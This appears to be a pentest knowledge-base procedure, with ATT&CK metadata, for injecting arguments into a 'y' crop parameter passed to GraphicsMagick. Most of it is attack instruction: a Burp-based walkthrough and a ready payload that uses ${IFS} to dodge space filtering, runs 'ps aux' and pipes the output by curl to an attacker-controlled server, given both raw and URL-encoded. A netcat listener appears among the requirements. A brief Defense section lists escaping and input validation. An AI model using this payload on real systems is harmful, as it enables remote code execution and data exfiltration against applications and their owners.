---
id: p5e6f7g8-h9i0-1234-efgh-5678901234
tags:
  - payload-injection
  - argument-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ps-aux-exfil]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:14.500Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Inject-Payload-into-Y-Parameter

## Summary

This procedure modifies the intercepted 'y' parameter in Burp Suite to inject a GraphicsMagick command that leads to shell execution and data exfiltration.

## Description

The 'y' parameter is concatenated into a 'gm convert' command without proper argument escaping, allowing injection of additional flags like '-write' followed by a pipe to shell commands. Using ${IFS} bypasses space filtering, enabling RCE via filename interpretation in GraphicsMagick.

## Requirements

1. Intercepted crop request in Burp
2. Attacker server ready (e.g., nc -lvp 80 or web server)
3. Knowledge of URL encoding

## Defense

Defensive measures and detection strategies:

- Use escapeshellarg() for all arguments in PHP shell_exec
- Validate input as numeric only for coordinates
- Log and WAF-block suspicious parameter values

## Objectives

1. Craft injection payload
2. URL-encode for transmission
3. Prepare for execution

## Instructions

### Step 1: Identify Y Parameter

**Context**: Locate the vulnerable parameter in the intercepted request.

**Command** (Inspection):

In Burp Repeater, view raw request and find y=NNN.

> y is numeric. Expected output: Base request confirmed.

### Step 2: Craft and Inject Payload

**Context**: Replace y with injection string using [[commands/ps-aux-exfil]] variant.

**Command** ([[commands/ps-aux-with-ifs]]):

Set y to '0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-', encode as '0%20-write%20|ps%24{IFS}aux|curl%24{IFS}http://<your-server>%24{IFS}-d%24{IFS}@-'

> Replace <your-server> with IP/domain. Expected output: Encoded payload in request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/ps-aux-with-ifs]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- gm-injection
- rce-payload
